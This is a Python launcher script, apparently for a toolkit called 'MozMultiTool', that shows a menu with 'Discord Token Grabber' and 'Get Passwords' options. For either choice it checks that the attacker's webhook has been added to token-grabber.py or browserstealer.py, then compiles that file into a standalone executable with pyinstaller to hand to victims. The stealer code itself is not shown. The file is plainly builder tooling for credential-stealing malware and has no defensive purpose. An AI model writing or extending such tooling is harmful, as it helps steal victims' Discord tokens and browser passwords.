from colorama import Fore, init
from termcolor import colored
from requests import get
from pick import pick
import os
init()

print(Fore.RED)
title = """   __  __          __  __       _ _   _ _____           _ 
  |  \/  | ___ ___|  \/  |_   _| | |_(_)_   _|__   ___ | |
  | |\/| |/ _ \_  / |\/| | | | | | __| | | |/ _ \ / _ \| |
  | |  | | (_) / /| |  | | |_| | | |_| | | | (_) | (_) | |
  |_|  |_|\___/___|_|  |_|\__,_|_|\__|_| |_|\___/ \___/|_|                                                         
"""

options = ['╔═════════════════════╗', '║Discord Token Grabber║', '║Get Passwords        ║', '╚═════════════════════╝']

option, index = pick(options, title, indicator='>', default_index=1)

if index == 1:
    with open('token-grabber.py') as f:
        contents = f.read()
        if 'WEBHOOK HERE' in contents:
            print('Must add your webhook in token-grabber.py')
        elif 'WEBHOOK HERE' not in contents:
            os.system('pyinstaller --onefile token-grabber.py')

if index == 2:
    with open('browserstealer.py') as f:
        contents = f.read()
        if 'WEBHOOK HERE' in contents:
            print('Must add your webhook in browserstealer.py')
        elif 'WEBHOOK HERE' not in contents:
            os.system('pyinstaller --onefile browserstealer.py')
